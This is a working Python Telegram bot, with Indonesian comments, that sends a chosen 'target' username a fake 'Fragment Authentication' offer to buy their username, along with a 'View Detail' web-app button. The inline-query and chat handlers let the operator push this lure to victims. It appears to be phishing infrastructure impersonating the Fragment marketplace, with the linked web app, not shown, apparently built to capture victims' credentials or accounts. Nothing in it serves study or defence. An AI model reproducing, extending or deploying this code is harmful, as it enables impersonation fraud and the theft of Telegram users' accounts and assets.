import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, InlineQueryResultArticle, InputTextMessageContent
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, InlineQueryHandler

# =================================================================
#               KONFIGURASI WAJIB: DIBACA DARI RAILWAY
# =================================================================
TOKEN = os.getenv("BOT_TOKEN") 
WEB_APP_URL = os.getenv("WEB_APP_URL") 
# =================================================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# -----------------------------------------------------------------
# 1. HANDLER UNTUK CHAT PRIBADI (POLLING MODE)
# -----------------------------------------------------------------

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menanggapi perintah /start dan meminta username."""
    await update.message.reply_text(
        "give username :"
    )

async def handle_username_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menerima input username dan membalas dengan tombol Web App (Mode Chat Langsung)."""
    
    chat_id = update.effective_chat.id
    username_input = update.message.text.strip().replace('@', '') 
    
    if not username_input or len(username_input) < 3:
        await update.message.reply_text("Username tidak valid.")
        return

    # Konstruksi URL Dinamis ke Vercel (Menggunakan Query Parameter)
    full_web_app_url = f"{WEB_APP_URL}?username={username_input}"

    reply_text = (
        f"Fragment Authentication : Direct offer to sell your username @{username_input}"
    )
    keyboard = [
        [
            InlineKeyboardButton(
                "View Detail", 
                web_app=WebAppInfo(url=full_web_app_url) 
            )
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await context.bot.send_message(
        chat_id=chat_id,
        text=reply_text,
        reply_markup=reply_markup
    )

# -----------------------------------------------------------------
# 2. HANDLER UNTUK INLINE BOT (BERBAGI PESAN DENGAN VIA @BOT)
# -----------------------------------------------------------------

async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Menanggapi query inline, mensimulasikan prompt 'give username :'."""
    
    query = update.inline_query.query.strip() 
    
    if not WEB_APP_URL:
        error_message = "❌ Error: Konfigurasi URL Vercel belum diatur di server Bot."
        results = [InlineQueryResultArticle(id="error", title="❌ Error Konfigurasi", 
                                            input_message_content=InputTextMessageContent(error_message))]
        await update.inline_query.answer(results, cache_time=5)
        return

    # --- KASUS 1: QUERY KOSONG (Simulasi 'give username :') ---
    if not query:
        results = [
            InlineQueryResultArticle(
                id="prompt",
                # Ini adalah yang terlihat saat Anda baru mengetik @NamaBot
                title="give username :", 
                description="Ketikkan username target (contoh: Sui_Panda)",
                input_message_content=InputTextMessageContent(
                    "Silakan ketik username target setelah nama bot, contoh: @NamaBotAnda Sui_Panda"
                )
            )
        ]
        await update.inline_query.answer(results, cache_time=5)
        return

    # --- KASUS 2: QUERY ADA (Membuat Pesan Rich Siap Kirim) ---
    username_target = query.replace('@', '')

    # Konstruksi URL Dinamis
    full_web_app_url = f"{WEB_APP_URL}?username={username_target}"

    # Konstruksi Tombol Web App
    inline_keyboard = [
        [
            InlineKeyboardButton(
                "View Detail", 
                web_app=WebAppInfo(url=full_web_app_url)
            )
        ]
    ]

    # Buat Konten Pesan yang akan Dikirim (INI YANG AKAN TERLIHAT DI CHAT)
    message_content = (
        f"Fragment Authentication : Direct offer to sell your username @{username_target}"
    )

    # Buat Hasil Inline Query
    results = [
        InlineQueryResultArticle(
            id=username_target, 
            # Title yang muncul di pop-up pratinjau setelah mengetik username
            title=f"Kirim Penawaran ke @{username_target}", 
            description=f"Fragment Authentication: Direct offer to sell your username @{username_target}", 
            
            input_message_content=InputTextMessageContent(
                message_content
            ),
            reply_markup=InlineKeyboardMarkup(inline_keyboard)
        )
    ]

    await update.inline_query.answer(results, cache_time=5)


# -----------------------------------------------------------------
# 3. FUNGSI UTAMA (SETUP)
# -----------------------------------------------------------------

def main() -> None:
    """Mulai Bot dan daftarkan handlers."""
    
    if not TOKEN:
        logger.error("BOT_TOKEN belum diatur di Environment Variables. Bot tidak bisa berjalan.")
        return

    application = Application.builder().token(TOKEN).build()

    # Daftarkan Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username_input))
    application.add_handler(InlineQueryHandler(inline_query)) # Inline Bot Handler

    logger.info("Bot sedang berjalan dan siap untuk menerima pesan...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()